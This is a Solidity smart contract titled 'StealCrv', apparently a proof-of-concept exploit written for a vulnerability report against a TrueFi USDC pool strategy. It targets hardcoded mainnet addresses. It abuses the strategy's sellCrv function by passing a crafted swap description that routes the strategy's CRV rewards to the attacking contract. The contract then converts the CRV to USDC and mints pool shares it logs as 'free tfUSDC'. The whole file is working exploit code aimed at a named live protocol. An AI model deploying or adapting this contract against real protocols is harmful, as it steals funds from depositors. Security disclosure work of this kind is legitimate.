pragma solidity ^0.6.6;
pragma experimental ABIEncoderV2;
import "hardhat/console.sol";
import { IERC20 } from "./aave/Interfaces.sol";
import "./ITrueFiPool.sol";
interface ITrueFiStrategy {
    function sellCrv(bytes calldata data) external;
    function collectCrv() external;
    function crvOracle() external returns(address);
}

interface IUniRouter {
    function token0() external view returns (address);

    function token1() external view returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface ICrvSwap {
    // def exchange_underlying(i: uint256, j: uint256, dx: uint256, min_dy: uint256) -> uint256:
    function exchange(uint i, uint j, uint dx, uint min_dy, bool use_eth) external returns(uint);
    // def exchange(i: uint256, j: uint256, dx: uint256, min_dy: uint256, use_eth: bool = False) -> uint256:

    //0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    /// @notice Swaps `amountIn` of one token for as much as possible of another token
    /// @param params The parameters necessary for the swap, encoded as `ExactInputSingleParams` in calldata
    /// @return amountOut The amount of the received token
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}


contract StealCrv {

    struct SwapDescription {
            IERC20 srcToken;
            IERC20 dstToken;
            address srcReceiver;
            address dstReceiver;
            uint256 amount;
            uint256 minReturnAmount;
            uint256 flags;
            bytes permit;
        }


    ITrueFiPool public pool;
    address public strategy;
    IERC20 public crv;
    IERC20 public usdc;
    IERC20 public weth;
    IUniRouter public router;
    ISwapRouter public routerv3;
    ICrvSwap public crvSwap;
    uint256 private constant _SHOULD_CLAIM = 0x04;

    constructor() public {
        // tfUSDC
        pool = ITrueFiPool(0xA991356d261fbaF194463aF6DF8f0464F8f1c742);
        // tfUSDC's strategy
        strategy = 0xe7f52d4F1C056FbfBF2b377de760510fa088bAef;
        // sushiswap router
        router = IUniRouter(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        // uniswap v3
        routerv3 = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        crv = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        crvSwap = ICrvSwap(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511);
    }

    function triggerSell() public {
        ITrueFiStrategy(strategy).collectCrv();

        uint256 crvBalance = crv.balanceOf(strategy);
        SwapDescription memory description = SwapDescription(
            crv, usdc, address(this), address(pool), crvBalance,
            1, // minreturn
            _SHOULD_CLAIM, ""
        );
        console.log("Trying to sell crv: ", crvBalance);
        // 0x7c025200 0x7c025200 swap
        bytes memory payload = abi.encodeWithSelector(0x7c025200, address(this), description, abi.encode(crvBalance, crvBalance, crvBalance));
        ITrueFiStrategy(strategy).sellCrv(payload);
    }

    fallback() external payable {
        
        // It's quite difficult to do a trade with small slippage at the time the issue is reported.
        // We follow the swapping router: https://etherscan.io/tx/0x5b8d30c6e241838673cb25957902eb651c7ee3550f56a8e01ac6437d5c38afda


        // Do not use on prod
        // require(msg.sender == 1inch)

        // Do not use this on prod
        uint256 totalCrvBalance = crv.balanceOf(address(this));

        console.log("Received Crv:", totalCrvBalance);

        // Comment  sushi's as crv pool offers a better price.

        // address[] memory path;
        // path = new address[](2);
        // path[0] = address(crv);
        // path[1] = address(weth);
        // crv.approve(address(crvSwap), totalCrvBalance);
        // crvSwap.exchange(1, 0, totalCrvBalance, 1, false);
        // router.swapExactTokensForTokens(totalCrvBalance,
        //     1, // Do not use this on prod.
        //     path,
        //     address(this),
        //     block.timestamp + 1
        // );

        uint256 wethAmount = weth.balanceOf(address(this));

        console.log("get weth amount: ", wethAmount);
        weth.approve(address(routerv3), wethAmount);
        ISwapRouter.ExactInputSingleParams memory swapParams = ISwapRouter.ExactInputSingleParams(
            address(weth),
            address(usdc),
            500,
            address(this),
            block.timestamp + 1,
            wethAmount,
            1, // do not use this on prod,
            0
        );
        routerv3.exactInputSingle(swapParams);

        uint usdcAmount = usdc.balanceOf(address(this));
        console.log("get USDC: ", usdcAmount);
        usdc.approve(address(pool), usdcAmount);
        pool.join(usdcAmount);
        console.log("Get free tfUSDC: ", pool.balanceOf(address(this)));
    }

    receive() payable external {
    }
}